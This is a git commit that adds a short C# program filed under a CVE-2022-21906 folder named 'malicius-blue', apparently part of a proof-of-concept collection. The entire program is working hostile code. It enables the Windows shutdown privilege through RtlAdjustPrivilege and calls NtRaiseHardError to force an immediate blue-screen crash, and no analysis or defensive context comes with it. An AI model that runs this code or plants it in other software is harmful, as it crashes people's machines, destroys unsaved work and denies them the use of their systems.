9e52c269cf21ec11c799405a7861bd137fe520e1
nu11secur1ty <venvaropt@gmail.com>
2022-01-25 00:29:12 -0800

    Add files via upload

---
+++ 2022/CVE-2022-21906/malicius-blue/Program.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace App
+{
+    class Program
+    {
+        [DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        [DllImport("ntdll.dll")]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+        static unsafe void Main(string[] args)
+        {
+            Boolean t1;
+            uint t2;
+            RtlAdjustPrivilege(19, true, false, out t1);
+            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+        }
+    }
+}
